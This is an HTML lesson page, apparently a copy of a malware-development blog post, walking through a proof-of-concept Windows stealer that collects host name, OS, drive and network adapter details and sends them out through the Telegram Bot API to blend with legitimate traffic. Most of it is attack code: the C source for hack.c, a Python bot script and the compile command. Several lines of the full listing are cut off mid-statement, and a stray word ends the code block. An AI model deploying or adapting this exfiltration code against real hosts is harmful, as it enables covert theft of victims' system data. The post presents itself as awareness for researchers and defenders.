@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development trick. Stealing data via legit Telegram</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #20</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development trick. Stealing data via legit Telegram</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">API. Simple C example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In one of my last presentations at the conference BSides Prishtina, the audience asked how attackers use legitimate services to manage viruses (C2) or steal data from the victim’s host. This post is just showing simple Proof of Concept of using Telegram Bot API for stealing information from Windows host.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s imagine that we want to create a simple stealer that will send us data about the victim’s host. Something simple like systeminfo and adapter info: char systemInfo[4096];</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// get host name
+CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
+DWORD size = sizeof(hostName) / sizeof(hostName[0]);
+GetComputerNameA(hostName, &amp;size); // Use GetComputerNameA for CHAR
+// get OS version
+OSVERSIONINFO osVersion;
+osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+GetVersionEx(&amp;osVersion);
+// get system information
+SYSTEM_INFO sysInfo;
+GetSystemInfo(&amp;sysInfo);
+
+// get logical drive information
+DWORD drives = GetLogicalDrives();
+// get IP address
+IP_ADAPTER_INFO adapterInfo[16]; // Assuming there are no more than 16 adapters
+DWORD adapterInfoSize = sizeof(adapterInfo);
+if (GetAdaptersInfo(adapterInfo, &amp;adapterInfoSize) != ERROR_SUCCESS) {
+printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
+return false;
+}
+snprintf(systemInfo, sizeof(systemInfo),
+"Host Name: %s\n" // Use %s for CHAR
+"OS Version: %d.%d.%d\n"
+"Processor Architecture: %d\n"
+"Number of Processors: %d\n"
+"Logical Drives: %X\n",
+hostName,
+osVersion.dwMajorVersion, osVersion.dwMinorVersion,
+osVersion.dwBuildNumber,
+sysInfo.wProcessorArchitecture,
+sysInfo.dwNumberOfProcessors,
+drives);
+// Add IP address information
+for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter-&gt;Next) {
+snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
+"Adapter Name: %s\n"
+"IP Address: %s\n"
+"Subnet Mask: %s\n"
+"MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n",
+adapter-&gt;AdapterName,
+adapter-&gt;IpAddressList.IpAddress.String,
+adapter-&gt;IpAddressList.IpMask.String,
+adapter-&gt;Address[0], adapter-&gt;Address[1], adapter-&gt;Address[2],
+adapter-&gt;Address[3], adapter-&gt;Address[4], adapter-&gt;Address[5]);
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">But, if we send such information to some IP address it will seem strange and suspicious. What if instead you create a telegram bot and send information using it to us? First of all, create simple telegram bot:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, we can use HTTP API for conversation with this bot. At the next step install telegram library for python:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 -m pip install python-telegram-bot</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, I slightly modified a simple script: echo bot - mybot.py: #!/usr/bin/env python # pylint: disable=unused-argument # This program is dedicated to the public domain under the CC0 license. """ Simple Bot to reply to Telegram messages. First, a few handler functions are defined. Then, those functions are passed to the Application and registered at their respective places. Then, the bot is started and runs until we press Ctrl-C on the command line. Usage: Basic Echobot example, repeats messages. Press Ctrl-C on the command line or send a signal to the process to stop the bot. """</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">import logging
+from telegram import ForceReply, Update
+from telegram.ext import Application, CommandHandler, ContextTypes,
+MessageHandler, filters
+# Enable logging
+logging.basicConfig(
+format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+# set higher logging level for httpx to avoid all GET and POST requests being logged
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logger = logging.getLogger(__name__)
+# Define a few command handlers. These usually take the two arguments update and
+# context.
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -&gt; None:
+"""Send a message when the command /start is issued."""
+user = update.effective_user
+await update.message.reply_html(
+rf"Hi {user.mention_html()}!",
+reply_markup=ForceReply(selective=True),
+)
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -&gt; None:
+"""Send a message when the command /help is issued."""
+
+await update.message.reply_text("Help!")
+async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -&gt; None:
+"""Echo the user message."""
+print(update.message.chat_id)
+await update.message.reply_text(update.message.text)
+def main() -&gt; None:
+"""Start the bot."""
+# Create the Application and pass it your bot's token.
+application = Application.builder().token("my token here").build()
+# on different commands - answer in Telegram
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CommandHandler("help", help_command))
+# on non command i.e message - echo the message on Telegram
+application.add_handler(MessageHandler(filters.TEXT &amp; ~filters.COMMAND, echo))
+# Run the bot until the user presses Ctrl-C
+application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == "__main__":
+main()</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, I added printing chat ID logic: async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None: """Echo the user message.""" print(update.message.chat_id) await update.message.reply_text(update.message.text) Let’s check this simple logic:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 mybot.py</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, chat ID successfully printed. For sending via Telegram Bot API I just created this simple function:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// send data to Telegram channel using winhttp
+int sendToTgBot(const char* message) {
+const char* chatId = "466662506";
+HINTERNET hSession = NULL;
+HINTERNET hConnect = NULL;
+hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+if (hSession == NULL) {
+fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
+return 1;
+}
+hConnect = WinHttpConnect(hSession, L"api.telegram.org",
+
+INTERNET_DEFAULT_HTTPS_PORT, 0);
+if (hConnect == NULL) {
+fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hSession);
+}
+HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
+L"/bot---xxxxxxxxYOUR_TOKEN_HERExxxxxx---/sendMessage", NULL,
+WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+if (hRequest == NULL) {
+fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+}
+// construct the request body
+char requestBody[512];
+sprintf(requestBody, "chat_id=%s&amp;text=%s", chatId, message);
+// set the headers
+if (!WinHttpSendRequest(hRequest,
+L"Content-Type: application/x-www-form-urlencoded\r\n", -1,
+requestBody, strlen(requestBody), strlen(requestBody), 0)) {
+fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hSession);
+printf("successfully sent to tg bot :)\n");
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So the full source code is looks like this - hack.c:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.c
+* sending victim's systeminfo via
+* legit URL: Telegram Bot API
+* author @cocomelonc
+*/
+#include &lt;stdio.h&gt;
+
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winhttp.h&gt;
+#include &lt;iphlpapi.h&gt;
+// send data to Telegram channel using winhttp
+int sendToTgBot(const char* message) {
+const char* chatId = "466662506";
+HINTERNET hSession = NULL;
+HINTERNET hConnect = NULL;
+
+hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_N
+if (hSession == NULL) {
+fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
+return 1;
+}
+hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+if (hConnect == NULL) {
+fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hSession);
+}
+
+HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot----TOKEN----/sendMessage
+if (hRequest == NULL) {
+fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+}
+// construct the request body
+char requestBody[512];
+sprintf(requestBody, "chat_id=%s&amp;text=%s", chatId, message);
+// set the headers
+if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n",
+fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hRequest);
+
+WinHttpCloseHandle(hSession);
+printf("successfully sent to tg bot :)\n");
+return 0;
+}
+// get systeminfo and send to chat via tgbot logic
+int main(int argc, char* argv[]) {
+// test tgbot sending message
+char test[1024];
+const char* message = "meow-meow";
+snprintf(test, sizeof(test), "{\"text\":\"%s\"}", message);
+sendToTgBot(test);
+char systemInfo[4096];
+// Get host name
+CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
+DWORD size = sizeof(hostName) / sizeof(hostName[0]);
+GetComputerNameA(hostName, &amp;size); // Use GetComputerNameA for CHAR
+// Get OS version
+OSVERSIONINFO osVersion;
+osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+GetVersionEx(&amp;osVersion);
+// Get system information
+SYSTEM_INFO sysInfo;
+GetSystemInfo(&amp;sysInfo);
+// Get logical drive information
+DWORD drives = GetLogicalDrives();
+// Get IP address
+IP_ADAPTER_INFO adapterInfo[16]; // Assuming there are no more than 16 adapters
+DWORD adapterInfoSize = sizeof(adapterInfo);
+if (GetAdaptersInfo(adapterInfo, &amp;adapterInfoSize) != ERROR_SUCCESS) {
+printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
+return false;
+}
+snprintf(systemInfo, sizeof(systemInfo),
+"Host Name: %s\n" // Use %s for CHAR
+"OS Version: %d.%d.%d\n"
+"Processor Architecture: %d\n"
+
+"Number of Processors: %d\n"
+"Logical Drives: %X\n",
+hostName,
+osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
+sysInfo.wProcessorArchitecture,
+sysInfo.dwNumberOfProcessors,
+drives);
+// Add IP address information
+for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter-&gt;Next) {
+snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
+"Adapter Name: %s\n"
+"IP Address: %s\n"
+"Subnet Mask: %s\n"
+"MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n\n",
+adapter-&gt;AdapterName,
+adapter-&gt;IpAddressList.IpAddress.String,
+adapter-&gt;IpAddressList.IpMask.String,
+adapter-&gt;Address[0], adapter-&gt;Address[1], adapter-&gt;Address[2],
+adapter-&gt;Address[3], adapter-&gt;Address[4], adapter-&gt;Address[5]);
+}
+char info[8196];
+snprintf(info, sizeof(info), "{\"text\":\"%s\"}", systemInfo);
+int result = sendToTgBot(info);
+if (result == 0) {
+printf("ok =^..^=\n");
+} else {
+printf("nok &lt;3()~\n");
+}
+return 0;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s check everything in action.</p>
+
+            <div id="compile-our-stealer-hack-c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Compile our “stealer” hack.c:</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \ -I/usr/share/mingw-w64/include/ \ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive -liphlpapi -lwinhttp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run it on my Windows 11 VM: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we check traffic via Wireshark we got IP address 149.154.167.220: whois 149.154.167.220</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly =.. =! Scanning via WebSec Malware Scanner:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://websec.nl/en/scanner/result/45dfcb29-3817-4199-a6ef-da00675c6c32 Interesting result. Of course, this is not such a complex stealer, because it’s just “dirty PoC” and in real attacks stealers with more sophisticated logic are used, but I think I was able to show the essence and risks. I hope this post with practical example is useful for malware researchers, red teamers, spreads awareness to the blue teamers of this interesting technique. Telegram Bot API https://github.com/python-telegram-bot/python-telegram-bot WebSec Malware Scanner source code in github</p></main></body></html>
